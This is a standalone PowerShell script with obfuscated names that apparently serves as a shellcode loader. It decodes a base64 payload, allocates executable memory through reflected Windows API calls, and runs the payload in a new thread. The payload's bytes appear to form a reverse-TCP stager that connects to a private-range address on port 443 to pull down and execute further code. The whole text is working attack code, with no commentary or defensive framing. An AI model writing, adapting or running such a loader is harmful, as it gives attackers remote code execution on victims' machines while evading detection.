function hIaUo {
	Param ($xu, $mPd)		
	$frz = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $frz.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($frz.GetMethod('GetModuleHandle')).Invoke($null, @($xu)))), $mPd))
}

function lu_UB {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $cqQj,
		[Parameter(Position = 1)] [Type] $ve = [Void]
	)
	
	$tp = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$tp.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $cqQj).SetImplementationFlags('Runtime, Managed')
	$tp.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ve, $cqQj).SetImplementationFlags('Runtime, Managed')
	
	return $tp.CreateType()
}

[Byte[]]$yX_B = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmgKCg9WaAIAAbuJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=")
		
$dlX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hIaUo kernel32.dll VirtualAlloc), (lu_UB @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $yX_B.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($yX_B, 0, $dlX, $yX_B.length)

$fUJG5 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hIaUo kernel32.dll CreateThread), (lu_UB @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dlX,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hIaUo kernel32.dll WaitForSingleObject), (lu_UB @([IntPtr], [Int32]))).Invoke($fUJG5,0xffffffff) | Out-Null
